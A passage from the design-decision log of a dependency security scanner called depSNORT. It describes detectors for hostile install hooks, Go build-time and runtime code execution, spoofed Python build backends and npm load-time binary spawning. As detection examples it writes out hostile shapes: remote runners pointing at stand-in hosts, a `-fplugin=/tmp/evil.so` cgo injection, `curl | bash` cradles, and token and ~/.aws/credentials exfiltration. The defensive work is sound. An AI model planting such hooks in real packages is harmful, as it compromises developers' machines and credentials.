have teeth by mutation (dropped offline guard, `run` added to the install subcommands, husky
added to the persistence set — all flip a negative). The OPU-19 frozen probe table is
unchanged (none of its snippets carry the new trigger strings). Validated against a live
oracle — the real published manifests fetched from registry.npmjs.org: `@meshtastic/core`'s
npx guard reads network+exec end-to-end through Analyze, smart-buffer/socks' npm-install
prepublish reads network, and node-gyp-build/`npm run build` stay quiet. gofmt/vet clean, go
test -race ./... green (33 packages).

Deferred (proposed, not built): Part D — a data-driven allowlist of known-benign runner
targets (`only-allow`, well-known generators) to downgrade guard-clause noise, mirroring the
husky exclusion; and a separate hardening pass on the incidental `& ` exec marker (PowerShell
call-operator matching shell `&&`). Both left pending a call on whether the noise justifies
the maintenance surface.

## D-88 — OPU-27 Part D: data-driven benign-runner allowlist (quiet the guard-clause noise)

OPU-27 Part A scored every package runner (`npx`/`dlx`/`bunx`) as CapNetwork + CapExec
(VC-002b). Correct at the shape level — npx fetches and runs a registry package at the
consumer's install — but on a clean tree the recurring `npx only-allow pnpm` preinstall
guard produced a gate-eligible finding on a hook that carries no payload: `only-allow`
inspects `npm_config_user_agent`, errors if the wrong package manager is in use, and exits.
That is warning tax, and the persistence-vs-benign split (OPU-19) exists to avoid it.

Part D is the runner analogue of the husky exclusion, but data-driven: `benignRunnerTargets`
is a curated, exact-match allowlist of runner targets that are known-benign guard clauses.
A runner whose target is on the list is DISCLOSED (a `benign-runner:<target>` evidence
marker) but raises no capability, so it does not fire VC-002b. The list is seeded with
`only-allow` alone and kept deliberately tiny — a guard clause is a narrow, well-known shape,
and each entry is warning tax the tool foregoes, so growth must clear the same bar.

Two disciplines make the suppression safe, both proven by mutation:

- **Exact match, distance-0.** `isBenignRunnerTarget` compares case-insensitively but not by
  substring or edit distance, so `only-alow` (typosquat) and `only-allow-evil` (a different
  package that embeds the name) are NOT benign and score normally. Mutating the compare to a
  substring test laundered the typosquat and flipped the test.
- **Per-invocation judgement.** The runner block now iterates EVERY runner invocation in a
  hook (runnerTargetRe captures each target) and classifies each on its own. A benign or
  offline runner can no longer launder a hostile one in the same hook — `npx only-allow pnpm
  && npx evildoer` still scores network+exec on `evildoer`. This also fixed a latent Part A
  gap: the offline suppression was a whole-hook test, so `npx --offline safe && npx evildoer`
  wrongly went quiet; it is now tested against each invocation's own substring. Regressing
  either to whole-hook flipped a test.

The change deliberately FLIPS the disposition of `npx only-allow pnpm` from Part A's
network+exec to quiet-but-disclosed; the OPU-27 Part A test was updated accordingly (its
generic-runner positives now use a non-allowlisted target) and a new test asserts the benign,
laundering, offline-laundering, and typosquat cases. Findings gate on capabilities, and the
only place install-surface evidence is ever interpreted is VC-002g's IsPersistenceMarker,
which a `benign-runner:` marker fails — so the disclosure marker is inert to every check.

Proof: validated against the real meshclaw manifest end-to-end through Analyze —
@meshtastic/core's `npx only-allow pnpm` preinstall now yields no hook (quiet), while
smart-buffer/socks' npm-install prepublish (Part B, untouched) still reaches the network. The
OPU-19 frozen probe table is unchanged. gofmt/vet clean, go test -race ./... green (33
packages). This closes the OPU-27 Part D item; the incidental `& ` exec-marker hardening
remains the one deferred follow-up.

## D-89 — OPU-27 follow-up: precise PowerShell call-operator marker (drop the incidental && → exec)

The exec-marker set carried `"& "` (ampersand-space) as a plain substring for the PowerShell
CALL operator. But `"& "` is a substring of the shell logical-AND `"&& "` and of a trailing
background `"& "`, both ubiquitous in benign hooks — so `npm install -g typescript && npm run
build` (smart-buffer/socks) and every other `a && b` script picked up an incidental CapExec it
never earned. Noted as out of scope in OPU-27; this is the hardening pass.

The bare substring is replaced by psCallOperatorRe, which matches the call operator
structurally: a single `&` — not the second `&` of `&&` (the leading `(?:^|[^&])` rules that
out) — followed by an invocation target that is a quote, a scriptblock `{`, or a variable `$`
(`& "C:\p.exe"`, `& {…}`, `& $payload`, and the no-space `&"p.exe"`/`&$payload` forms). Shell
`&&` and a background `&` before a BAREWORD no longer match; a bare `& word` is deliberately
left unmatched because it is ambiguous with shell backgrounding, and the dangerous PowerShell
shapes are the quoted/scriptblock/variable invocations (covered here) or the iex /
Start-Process markers that remain. An ampersand before a quote or variable is treated as an
invocation in either the shell-background or PS-call reading, so it stays scored — the fix
targets `&&` and bareword-background, not command invocation.

This removes the spurious CapExec from the smart-buffer/socks hook: it is now CapNetwork only
(the Part B install fetch), which is the correct reading — the `&&` was never execution. Real
PowerShell payloads keep their CapExec: the NuGet install.ps1 path already appends CapExec
unconditionally (AnalyzeDotNet), and `iex`/`Start-Process`/LOLBin markers are untouched.

Proof: a table test asserts the call-operator positives (quoted path, scriptblock, variable,
no-space forms) score exec, and the negatives (`&&` chains, background `&` before a bareword,
`&&` directly before a quote) stay quiet — including the exact smart-buffer/socks hook, which
keeps CapNetwork and loses the incidental CapExec. Each regex guard is proven by mutation:
dropping the `(?:^|[^&])` anchor launders `&&`-before-a-quote, and broadening the invocation
target to any character reintroduces the original `&&` bug — both flip a negative. The OPU-19
frozen probe table and the esbuild regression (whose CapExec comes from child_process, not the
removed marker) are unchanged. gofmt/vet clean, go test -race ./... green (33 packages). This
clears the last OPU-27 deferred item.

## D-90 — OPU-27 Part E: package runners across every ecosystem (+ the quote-prefix boundary fix)

OPU-27 shipped pkg-runner coverage for JS only (npx/bunx/dlx). The other ecosystems have
equivalent fetch-and-execute-a-package runners an install hook can abuse identically — a
setup.py that shells `pipx run <attacker>`, an extconf.rb that runs `gem exec <attacker>`.
Part E extends the runner detector to them at parity with npx, closing the one asymmetry in
the OPU-27 matrix (pkg-install and git-hook persistence already reach all ecosystems).

Runners added (fetch + run → CapNetwork + CapExec → VC-002b, composing to VC-002d with a
credential half): Python `pipx run` / `uvx` / `uv tool run`; Ruby `gem exec`; .NET `dnx`. The
run-an-already-installed-bin forms are excluded (no fetch, no capability): `pnpm exec`, `yarn
exec`, `bundle exec`, `dotnet tool run`, `composer exec`, `poetry run`, `python -m`. Offline
suppression extended to `uvx --offline` / `uv tool run --offline` (`pipx run` has no offline
flag). Evidence labels stay accurate: `gem exec` is `pkg-runner`, `gem install` is
`pkg-install` — both reach the network, different shapes.

Two implementation decisions:

- **Unified, not a parallel regex.** The Part-E spec proposed a separate `pkgRunnerXRe` block.
  Instead the non-npm runners were folded into the existing `runnerTargetRe` (the Part-D
  capturing runner regex), so they inherit — for free — per-invocation judgement (a benign or
  offline runner cannot launder a hostile one in the same hook), the offline suppression, and
  the benign-runner allowlist (which stays npm-only, since no non-npm guard clause is on it). A
  separate whole-text block would have reintroduced the very laundering gap Part D closed.

- **The quote-prefix boundary fix.** A probe of the merged code found the runner and install
  detectors did NOT fire on the realistic non-npm shape: a runner invoked from a shell string
  inside setup.py / extconf.rb (`os.system('pipx run evil')`) — the prefix guard `[\s;&|(]`
  admitted no quote character, so the keyword abutting an opening quote never matched. This is
  the boundary bug the OPU-27 handoff/validation record describe fixing, which never landed in
  the applied patch. The quote characters `'"` are added to the prefix class of BOTH
  `runnerTargetRe` and `pkgInstallRe`. The quote must ABUT the keyword, which selects
  command-strings (`'pip install …'`) over prose that merely mentions one (`"Please run pip
  install"`, already matched via the space boundary), and word-boundary precision is preserved
  (`xpip install` still does not match). This is consistent with the tool's existing acceptance
  of substring network markers (curl/wget), and is what lets pkg-install/pkg-runner fire
  through the Python and Ruby analyzers, not only npm command strings.

Proof: opu27_xeco_test.go routes positives through the REAL AnalyzePython / AnalyzeRuby /
AnalyzeDotNet (pipx run / uvx / uv tool run via os.system in setup.py, gem exec bare and
backtick in extconf.rb, dnx in install.ps1 → network+exec), asserts the excludes stay off the
network axis, and proves the VC-002d exfil substrate (gem exec fetch + ~/.aws/credentials read
→ network+credentials on one hook). Each guard shown to have teeth by mutation: dropping `gem
exec` from the runner set, dropping the quote characters from the prefix, and dropping `uv tool
run` from the offline set each flip a case. The OPU-19 frozen probe table and the esbuild
regression are unchanged. gofmt/vet clean, go test -race ./... green (33 packages).

Out of scope, tracked honestly: pkgInstallRe does not match `dotnet tool install` / `pipx
install` / `uv tool install` — pre-existing pkg-install gaps, orthogonal to this runner-scoped
change; and Go still has no install-surface extraction at all (no lifecycle-script manifest —
it would need go-generate / cgo / -ldflags / build-tag-init analysis), a subsystem flagged as
candidate OPU-28, not a Part-E gap.

## D-91 — OPU-28 (Increment 1): Go install-surface — the go:generate build directive

Go was the one covered ecosystem with NO install-surface extraction (the OPU-27 Part-E §8
gap): it has resolution, expansion, OSV, and the temporal axis, but the VC-002 family never
saw a Go "hook", because Go runs no package code at `go get` or `go build` by design — it has
no lifecycle-script manifest. This begins the subsystem that gives Go its first VC-002
coverage.

Increment 1 extracts the `//go:generate` directive. It is Go's closest analog to a lifecycle
script: an arbitrary command shipped in the package. Its trigger is deliberately weaker than an
npm postinstall — a directive runs only when a developer invokes `go generate`, never at
`go build`/`go get` — and the finding is honest about that. But `go generate ./...` is a
routine dev/CI step, so a hostile directive in a dependency is weaponizable, and it is the
strongest "arbitrary command in a package" shape Go offers.

Design:

- **installsurface.AnalyzeGo(sources)** extracts `//go:generate <command>` directives
  (line-anchored: Go requires no space after `//`, so a `// go:generate …` comment or a
  `"//go:generate …"` string literal is NOT a directive) and classifies each command through
  the shared scanCaps engine. A directive is recorded ONLY if it carries a capability, so a
  benign local generator (`mockgen`, `stringer`, `go run ./internal/gen`) is silent and adds no
  graph node — the run-vs-fetch discipline applied to codegen, and what keeps the addition from
  taxing every Go module that uses go:generate. A `curl | bash` directive is a cradle
  (VC-002f), a `wget` fetch is network (VC-002b), a `curl -H "$NPM_TOKEN"` exfil composes to
  VC-002d. No new capability, no new check ID — it reuses the whole VC-002 family. Multiple
  directives in one file get indexed unique hook names so they do not collide to one node.

- **gomod.ExtractInstallSurface** (the adapter finally implementing InstallSurfaceExtractor,
  auto-dispatched by the interface assertion in main) walks the ROOT module's own .go files
  through securefs (containment + size caps), bounded at maxGoFiles, skipping the dirs Go itself
  ignores (vendor/, testdata/, '.'/'_'-prefixed). Symlinked directories are not followed (an
  os.DirEntry symlink reports IsDir()==false), so there is no traversal cycle and no escape.
  Hooks attribute to the root gomod node — the clone-and-assess-a-module workflow.

Proof: AnalyzeGo unit tests (cradle/network/exfil positives; mockgen/stringer/go-run-local and
the space-after-`//` / prose negatives; multi-directive unique naming) and end-to-end wiring
tests through the real gomod adapter into the VC-002 family (curl|bash → VC-002f block,
NPM_TOKEN exfil → VC-002d block, ordinary generate silent, a vendored directive out of scope
while the root's fires). Each guard mutation-proven: allowing a space after `//`, dropping the
capability gate, and un-skipping vendor/ each flip a case. Real-world oracle: a scan of
depSNORT's own 251 .go files — where `//go:generate` appears only inside strings and comments —
yields zero hooks, confirming the line anchor does not false-positive on real code.
gofmt/vet clean, go test -race ./... green.

Deferred to later OPU-28 increments (documented, not silent): per-dependency attribution from
vendor/ and the module cache; cgo `#cgo CFLAGS/LDFLAGS` flag injection (`-fplugin=`, linker-flag
abuse — build-time exec at `go build`, the stronger-trigger vector, needing tight flag
discipline since bare cgo is ubiquitous); build-tag-gated `init()` evasion (runtime); and
`go run <remote>@<version>` as a Go package runner (an npx analog). The Go blank column is now
opened, not closed.

## D-92 — OPU-28 (Increment 2): Go cgo #cgo build-flag injection (VC-002h)

Increment 1 gave Go the go:generate directive — an on-demand `go generate` trigger. Increment
2 adds the vector that fires at `go build` itself: a cgo `#cgo` directive that injects a
compiler/linker flag arranging code execution. `#cgo CFLAGS: -fplugin=/tmp/evil.so` loads a
compiler plugin; `-B<dir>` redirects the compiler's tool search (running the attacker's as/ld);
`-specs=` overrides the GCC specs file; an `@file` response file smuggles otherwise-rejected
flags; a shell metacharacter injects a command. None of these appear in a legitimate published
module.

The discipline is the whole game: bare cgo is ubiquitous (`-I`/`-L`/`-l`/`-D`/`-std=`/
`pkg-config`), so the detector keys on the DANGEROUS flag shapes only, never cgo presence. It
is examined only in files that actually `import "C"`, and `${SRCDIR}` — the legitimate cgo
source-dir variable, which uses `${…}` not `$(` — is deliberately not read as a shell
metacharacter, nor is a `-Wl,-Bsymbolic` linker flag mistaken for a `-B` tool redirect.

This is the first vector in the family that does NOT map to an existing capability: a cgo flag
injection is CapExec ALONE, and CapExec alone fires no VC-002 check (a bare hook is VC-002a, and
the dangerous checks compose network/creds/cradle). So it gets a dedicated judge, VC-002h,
gated exactly the way VC-002g gates persistence: on CapExec plus a marker predicate
(installsurface.IsCgoInjectionMarker, matching `cgo-inject:<reason>`), so an ordinary cgo file
— CapExec-free, marker-free — stays silent. It is high/gate-eligible, not a block: modern
`go build` already rejects most such flags through its own cgo flag allowlist, so the finding
flags a suspicious, review-worthy shape (older toolchains, CGO_*_ALLOW misconfig, and allowlist
bypasses remain exposed) rather than asserting a guaranteed-live exploit. AnalyzeGo carries both
Increment-1 (go:generate) and Increment-2 (cgo) extraction; the gomod adapter and the walk are
unchanged. The check is registered in builtin.Default() (the drift guard TestDefaultRegisters-
EveryCheck enforces registration).

Proof: AnalyzeGo unit tests (plugin / -Xclang -load / -specs= / -B / @file / shell-metachar
positives; benign lib-flags, cflags, pkg-config, `${SRCDIR}`, `-Wl,-Bsymbolic`, and a
non-cgo-file negative) and an end-to-end wiring test through the real gomod adapter into
VC-002h (a `-fplugin` directive fires; an ordinary `pkg-config: sqlite3` file stays silent).
Each guard mutation-proven: dropping `-fplugin` from the plugin detector, dropping the
`import "C"` gate, broadening the shell metacharacter set to bare `$` (which then swallows
`${SRCDIR}`), and dropping the marker gate on VC-002h (which then fires on every CapExec hook,
including an ordinary build.rs) each flip a case. Real-world oracle: a re-scan of depSNORT's own
251 .go files with cgo detection active still yields zero hooks. gofmt/vet clean, go test -race
./... green.

Deferred to later OPU-28 increments (documented): per-dependency attribution from vendor/ and
the module cache; build-tag-gated init() evasion (runtime); and `go run <remote>@<version>` as
a Go package runner.

## D-93 — OPU-28 (Increment 3): build-tag-gated init evasion (VC-002i)

Increments 1-2 covered Go's `go generate` (on-demand) and cgo `#cgo` (at `go build`) vectors.
Increment 3 covers the RUNTIME one: a package that auto-runs code at program startup — an
init() or a blank-identifier var initializer (`var _ = boot()`) — hidden behind a build
constraint. The constraint is the evasion: a `//go:build` tag or a GOOS/GOARCH filename suffix
(`telemetry_linux.go`) makes the code conditionally compiled, so it is dormant on a reviewer's
platform, skipped by tests/CI running elsewhere, and thus escapes default-build scrutiny — while
still running on the targeted platform when the consumer runs their program.

The evasion needs three ingredients together, and all three are required to fire: (1)
conditionally compiled (explicit build tag or platform-suffix filename), (2) auto-runs at
startup (`func init()` or a blank-var CALL initializer — a `var _ Type = value` interface
assertion has text between `_` and `=` and is deliberately not matched), and (3) carries a
network / download-cradle / decode-obfuscation / credential capability. Bare init(), an
unconstrained file, an ordinary platform file that merely registers a driver, an exec-ONLY init
(a platform file legitimately shelling out to a system tool), and a test file (its init runs
only under `go test`, never in a consumer's binary) all stay silent.

Honest framing drove the wiring. A runtime init is NOT an install hook, so exposing CapNetwork
would make VC-002b report "install hook reaches the network" — a mislabel of the trigger. So the
extractor exposes NO install-hook capability (Hook.Caps is nil, which trips nothing in the
existing family — VC-002a is npm-only, VC-002b-f gate on caps). The facts ride evidence markers
`init-constraint:<what>` and `init-cap:<reason>` that only the dedicated judge, VC-002i, reads
(installsurface.IsInitEvasionMarker). VC-002i is high/gate-eligible: a strong, review-worthy
evasion shape, not a proven-live compromise. It is registered in builtin.Default() (the drift
guard enforces registration). AnalyzeGo now carries all three OPU-28 increments; the gomod
adapter and walk are unchanged.

Proof: AnalyzeGo unit tests (build-tag/filename-suffix/blank-var/legacy-+build positives across
network/decode/cradle/credential; unconstrained, benign-register, no-init, exec-only, test-file,
and interface-assertion negatives) and an end-to-end wiring test through the real gomod adapter
into VC-002i (a `telemetry_linux.go` init that beacons fires VC-002i AND explicitly NOT VC-002b;
an ordinary `driver_linux.go` register-init stays silent). Each guard mutation-proven: dropping
the constraint requirement, adding CapExec to the dangerous set, dropping the auto-run
requirement, and exposing the capabilities (Caps not nil, which then mislabels the init as a
VC-002b install-hook network reach) each flip a case. Real-world oracle: a re-scan of depSNORT's
own 251 .go files (5 of them build-constrained) with init-evasion detection active still yields
zero hooks. gofmt/vet clean, go test -race ./... green.

Deferred to later OPU-28 increments (documented): per-dependency vendor/ and module-cache
attribution; and `go run <remote>@<version>` as a Go package runner (an npx analog). With
Increment 3 the three build-surface execution phases Go actually has — on-demand generate,
build-time cgo, and runtime init — are all covered.

## D-94 — OPU-28 (Increment 4): `go run <module>@<version>` — the Go package runner

The last OPU-28 build-surface item: Go's own npx analog. Since Go 1.17, `go run
<module>@<version>` FETCHES and RUNS a remote module in one step (network + exec). It most
often rides a `//go:generate go run evil.example/cmd@latest` directive — which Increment 1
already extracts through scanCaps, but which produced no capability because `go run` was not a
runner marker, so a hostile remote runner was a silent miss.

goRunRemoteRe adds it, keyed on the `@version` suffix — the exact run-vs-fetch discriminator:
Go requires `@version` to fetch a remote module, so `go run ./internal/gen`, `go run .`, and
`go run main.go` (local code, no fetch) carry no version and stay quiet, the same discipline
that keeps `pnpm exec` off the runner set (Part E) and that Increment 1's benign
`go run ./local` go:generate relies on. A match is CapNetwork + CapExec → VC-002b (composing to
VC-002d with a credential half), the same verdict npx / pipx run / gem exec / dnx already get.
The prefix class carries `'"` so a shell-string invocation (`os.system('go run x@latest')`) is
caught too. `go install <module>@<version>` is unchanged — it is pkg-install (network), already
covered, and a different subcommand.

Honest note on noise. `go run <tool>@<version>` in a //go:generate directive is a common,
LEGITIMATE Go pattern for pinning a codegen tool (stringer, mockgen). It genuinely reaches the
network and executes remote code at generate time, so surfacing it as gate-eligible VC-002b is
the correct, consistent treatment — identical to how `npx only-allow pnpm` and the other benign
runners are scored (a benign network+exec runner is gate-eligible, never a block, and the
on-demand `go generate` trigger is weaker still). A Part-D-style allowlist of known-benign
`go run` tool modules is the natural noise-reduction refinement if the volume warrants it;
deferred, and noted so the register tracks it.

Proof: scanCaps table test (remote@version bare / with a flag / in a shell string → network+
exec; the local `go run` forms → quiet; `go install …@latest` unchanged) and an end-to-end
wiring test through the real gomod adapter (`//go:generate go run evil.example/cmd@latest` fires
VC-002b; `//go:generate go run ./internal/gen` stays silent). The `@version` discriminator is
mutation-proven: dropping it makes a local `go run main.go` wrongly fetch, flipping a negative.
Real-world oracle: a re-scan of depSNORT's own 251 .go files still yields zero hooks. gofmt/vet
clean, go test -race ./... green.

With this, OPU-28's build-surface coverage is complete across Go's three execution phases
(on-demand generate, build-time cgo, runtime init) plus the go-run remote-runner shape; the one
remaining register item is per-dependency vendor/ and module-cache attribution (Increment 1-4
scan the root module).

## D-95 — OPU-28 (Increment 5): per-dependency vendor / module-cache attribution

Increments 1-4 scanned only the ROOT module's .go files (the clone-and-assess-a-module
workflow). This extends the Go install-surface scan to DEPENDENCIES and attributes each
dependency's go:generate / cgo / init / go-run findings to that dependency's own graph node —
mirroring the cargo adapter's root-then-dependency structure, so a hostile directive buried in
a transitive Go module surfaces on the right package.

A dependency's source is located in two places, checked in order:

- **Vendored** — `vendor/<module-path>/`, inside the project, read through the project's
  securefs reader (containment + size caps). Go module paths are hierarchical, so a vendored
  SUBMODULE (`vendor/foo/bar/sub/`) physically nests inside its parent's directory
  (`vendor/foo/bar/`); the walk skips any subdirectory that is itself another dependency's
  vendored root, so the submodule's findings attribute to the submodule, not the parent. (The
  module cache has no such nesting — `bar@v1` and `bar/sub@v0.1` are separate dirs — so it needs
  no skip.)
- **Module cache** — `$GOMODCACHE/<escaped-path>@<version>/` (GOMODCACHE, else `$GOPATH/pkg/mod`,
  else `$HOME/go/pkg/mod`), out of project, read through a securefs reader rooted at that dir.
  The path applies Go's case-encoding (an uppercase letter U → `!u`, so `github.com/BurntSushi/
  toml` → `github.com/!burnt!sushi/toml`), replicated locally since goproxy's equivalent is
  unexported.

Safety: a module path or version that is not a clean, traversal-free identifier (empty, a `.`
or `..` segment, a backslash, or a NUL) is refused before it can steer a lookup out of the cache
or the project, and out-of-project cache reads still go through securefs containment. A
dependency present in NEITHER location is disclosed as a coverage gap (source-unavailable), not
skipped silently — the same honesty the cargo adapter keeps. The walk was refactored into a
shared collectGoSourcesUnder(start, skip) so the root scan, the vendor scan, and the cache scan
are one code path.

Proof: gomod-package tests — a vendored dependency's hostile go:generate attributes to the
dependency node and NOT the root; a module-cache dependency (with case-escaping, `github.com/
Evil/dep` → `!evil`) is found and attributed; a vendored submodule's finding attributes to the
submodule, not the parent whose directory contains it; cleanModuleIdent rejects traversal and
escapeGoCasePath encodes case. Each guard mutation-proven: removing the nested-submodule skip
makes the parent wrongly own the submodule's hook, and making the case-encoding a no-op makes an
uppercase cache dependency invisible — both flip a test. Real-world oracle: scanning depSNORT's
own 9 cached dependency modules (44 real .go files) through the per-dependency walk yields zero
hooks — no false positive on real third-party Go source. gofmt/vet clean, go test -race ./...
green.

This closes the OPU-28 register. Go's install-surface coverage now spans all three execution
phases (on-demand generate, build-time cgo, runtime init) and the go-run remote runner, at the
root AND across the dependency tree — the blank column is fully filled.

## D-96 — OPU-28 (Increment 2 follow-up): cgo directives in a line-comment preamble

A live-fire assessment (MoSLoF/meshclaw, companion handoff OPU27handoff_4) surfaced a gap in the
Increment-2 cgo detector (D-92, VC-002h): `cgoDirectiveRe` matched a `#cgo` directive only when it
began the line, i.e. the block-comment preamble form

```go
/*
#cgo LDFLAGS: -fplugin=/tmp/evil.so
*/
import "C"
```

Go accepts the preamble equally as line comments, where the directive line begins with `//`:

```go
// #cgo LDFLAGS: -fplugin=/tmp/evil.so
import "C"
```

The old regex `(?m)^[ \t]*#cgo\b[^\n]*` did not match the `// #cgo …` form, so a plugin-load (or
any other) build-flag injection written that way scored **zero** — a real evasion, not a benign
edge. The fix adds an optional comment prefix: `(?m)^[ \t]*(?://[ \t]*)?#cgo\b[^\n]*`. It is a
recognition widening only; the discipline is unchanged — the `import "C"` gate (`cgoImportRe`) and
the dangerous-flag requirement (`cgoInjectionReasons`) still decide whether a directive is
recorded, so a benign `// #cgo LDFLAGS: -lssl` stays silent exactly as its block-comment cousin
does. A real cgo directive always begins its comment line, so anchoring to `^[ \t]*(?://…)?` (not a
trailing `code // #cgo`) is correct.

Proof: the cgo injection table gains a `line-comment` positive (`// #cgo …-fplugin…` → CapExec +
cgo-inject marker) and a `benign line-comment` negative (`// #cgo LDFLAGS: -L… -lssl` stays quiet).
Mutation-proven: reverting the regex to the block-only form makes the line-comment positive fail
with an empty surface — the exact zero-score the assessment observed. Full suite green (33/0).

## D-97 — OPU-29: lockfile coverage for uv / poetry / pdm (PyPI) and pnpm (npm), + build-backend gate fix

Dogfooding depSNORT against a `uv`-locked project exposed that it could not read `uv.lock`: it fell
back to the pyproject manifest and returned a clean-looking but blind verdict over a mostly-guessed
graph. This adds a lockfile reader wherever the ecosystem adapter already exists — the cheap
reader-into-existing-adapter path, no new ecosystems — closing the sibling gaps for the resolved
lockfiles depSNORT did not yet parse, plus a coverage-semantics fix.

**Register ID.** The handoff proposed "OPU-27", but OPU-27 (install-surface package runners /
manager installs / git-hook persistence) and OPU-28 (Go install-surface) are already filed. This
work is filed as **OPU-29** and all in-code register references use that ID; the pre-existing
OPU-27 install-surface references are untouched.

**Four readers, all hand-rolled line scanners (D-10 — no third-party TOML/YAML parser), following
the in-tree `cargo` precedent that already hand-scans `Cargo.lock`:**

- **uv.lock** (pypi, TOML) — fully-resolved graph with per-package `dependencies`, so the transitive
  closure becomes observed fact, not presumption. Reads the editable `.` project as the subject; no
  D-24 flat-resolution penalty.
- **poetry.lock** (pypi, TOML) — synthesizes a root (the lock has none), `[package.dependencies]`
  sub-tables drive edges, group-based section tags, git-source provenance disclosed.
- **pdm.lock** (pypi, TOML) — PEP 508 dependency strings parsed via the existing `internal/pep508`
  helper; seeded the shared dependency-cycle attachment fix.
- **pnpm-lock.yaml** (npm, YAML) — an indentation-aware scanner over `importers` / `packages` /
  `snapshots`. Peer suffixes (`(react@18.0.0)`) are stripped to reconcile edge targets to bare
  nodes, collapsing peer-variants of one version onto a single node (a documented, disclosed
  simplification). lockfileVersion 9.x targeted; other versions best-effort + disclosed on the root.

A shared `attachUnrooted` pass guarantees every locked package is reachable from the (synthesized,
where needed) root, so a marker-gated dep (e.g. `tomli`, pulled only on `python_version < 3.11`) or a
peer/optional-stranded component never floats detached. Real edges give real BFS depths.

**Build-backend gate fix (cross-cutting).** Once the readers exposed full observed graphs, the
build-backend axis flagged nearly every package as carrying an unresolved backend, because
`build-system.requires` is almost always unpinned (`requires = ["hatchling"]`) — making almost every
scan read "incomplete" for a universal, benign reason. Fix: in `resolveBuildBackend`, a KNOWN
standard unpinned backend is recorded as a disclosed-but-non-gating fact (`pypi.build_backend`,
sorted + de-duplicated, kept out of `graph.AttrUnresolved`) instead of a coverage gap; the gate is
reserved for UNKNOWN backends, whose unresolvability is genuine signal. Behavior is unchanged for
unknown backends and for pinned `requires` (still resolved to a fetchable node). `uv_build` (Astral's
backend) is added to the known-backend set. Locked by `TestKnownBackendIsNonGating`.

Open decisions from the handoff, resolved here: synthesized-root attribution uses the in-degree-zero
heuristic as lock-only truth (no sibling-pyproject cross-reference); pnpm uses the bare-version node
model (peer-variant collapse accepted). Forward cases deliberately NOT built (documented, no
validation sample or low payoff): `pylock.toml` (PEP 751), `bun.lock` (JSONC; `bun.lockb` binary),
`Pipfile` (manifest, not a lock). `flake.lock` / `conan.lock` / `deno.lock` / `pom.xml` are unparsed
only because the ecosystem adapter is absent — separate adapter work, not this item.

Proof: five new tests — `TestParse{UvLock,PoetryLock,PdmLock,PnpmLock}` and
`TestKnownBackendIsNonGating`; full suite green (33/0), `-race` clean, `go vet` silent, gofmt no
diffs. The handoff validated each reader on a real target (getsploit/uv, poetry, pdm, vite/pnpm).

## D-98 — OPU-30: build-backend exact-match remediation (prefix-match trust bypass)

An OPU-29 erratum: `IsKnownBuildBackend` used `strings.HasPrefix(backend, known)`, so any backend
name STARTING WITH a known one was trusted — `hatchling.build_evil`, `hatchling.build.evil_submodule`,
`setuptools.build_meta_pwn`. That predicate is shared by two decisions: whether `analyzeBuildBackend`
fires the non-standard-backend hook, AND (via the D-97/OPU-29 gate) whether an unpinned backend counts
as a coverage gap. A malicious backend with a known prefix suppressed BOTH — it executed at build time
yet was invisible on every axis. A single predicate fix closes both.

**The fix.** A PEP 517 build-backend is `module` or `module:object`. The matcher strips the `:object`
suffix and matches the MODULE part EXACTLY against `knownBuildBackends` (which already holds full
module paths like `hatchling.build`, `setuptools.build_meta`, so exact-match does not break legit
backends). `hatchling.build_evil` / `.evil_submodule` / `setuptools.build_meta_pwn` no longer match;
`setuptools.build_meta:__legacy__` still does (module known). The object suffix on a genuinely known
module is not a naming vector — the executing code lives in the known module — so stripping it is safe.

**Second change.** The non-gating disclosure (`pypi.build_backend`) now records the real backend
MODULE reference (`hatchling.build`) instead of the sanitized requires-entry package name
(`hatchling`), so a future watch/drift rule sees the value that actually executes at build time.

Proof: `TestIsKnownBuildBackendExactMatch` locks the boundary — the known set (incl. the
`:__legacy__` object-suffix form) must trust, five prefix spoofs must flag. Mutation-proven: reverting
to `HasPrefix` fails all five spoofs. No OPU-29 regression — legit backends still match exactly and
stay non-gating; the three OPU-29 targets (getsploit 0 / poetry 5 / pdm 1 unresolved) are unchanged.
Full suite green (33/0), go vet silent, gofmt clean.

Deferred (not in this increment): build-backend baseline/drift on the drift axis (VC-010/11) — a
backend swap between a baselined version and its update is the real defense for the sleeper class, now
feasible because the disclosure carries the real backend reference. And periodic review of the
known-list, which is now the trust boundary (adding an entry is a one-line low-risk change; loosening
the match is not).

## D-99 — OPU-31: npm load-time (import-time) execution detection (VC-002j)

Closes depSNORT's blind spot to npm malware that runs at MODULE LOAD with no lifecycle script — the
evasion used by the RedC2 npm loader (disclosed 2026-08-21). The RedC2 packages carry no
install/postinstall script; their entry file (`dist/index.mjs`) re-exports the promised helpers and, at
import, marks a bundled native binary executable and spawns it detached. A single import anywhere in the
graph — even transitive — runs the payload. depSNORT's npm install-surface was seeded ONLY by
package.json lifecycle scripts (`if len(m.Scripts) == 0 { continue }`), so the entry module was never
read and a shipped native executable was invisible: a benign structural mimic scanned completely clean
(0 hooks / 0 findings).

**Extraction half** — `AnalyzeLoadTime(entryRel, entrySource, read)` in `internal/installsurface`. It
strips comments (D-25), scans the entry via the existing `scanCaps`, and — ONLY when the entry reaches an
exec capability — emits a `module-load:<entry>` hook with `load-time-execution` evidence. Sibling files
the entry references (quoted relative paths) are resolved relative to the entry's dir and read; any
carrying native-executable magic bytes is flagged `bundled-native-executable:<kind>`.
`nativeExecutableKind` is stdlib-only (D-10), reads leading magic bytes only — ELF (`\x7fELF`), PE
(`MZ`), Mach-O (thin + fat, both endiannesses; the `0xcafebabe` fat form also matches a Java class, itself
noteworthy in an npm entry so reported as mach-o). Nothing is executed (D-04) — magic-byte + string
inspection only. Sibling reads are capped at 16 per entry and go through the same containment/symlink-safe
reader as lifecycle scripts.

The npm adapter now reads `main`/`module`, DROPS the empty-scripts gate (so a script-less package is still
analyzed), and runs `AnalyzeLoadTime` on each entry candidate (`main`, `module`, `index.{js,mjs,cjs}`). An
absent entry file is read quietly (not a gap); only a referenced sibling that is REFUSED becomes a gap.

**Judgment half** — `HookLoadTimeNativeExec` (VC-002j), high / gate-eligible, escalates the precise
composition `load-time-execution` + `bundled-native-executable`. Load-time + NETWORK was already covered
by the cap-based checks (HookNetwork et al.), so VC-002j deliberately targets only the OFFLINE
load-time + bundled-native-binary fingerprint, avoiding double-reporting. A legitimate prebuilt-binary
package (esbuild, sharp) resolves its binary via `require.resolve` of a separate platform package and
invokes it lazily, so it does not spawn a raw ELF at module-load and VC-002j does not fire (verified
against the existing esbuild regression fixture).

FP posture / honest limits: `scanCaps` sees exec anywhere in the entry (no JS parser under D-10), so a
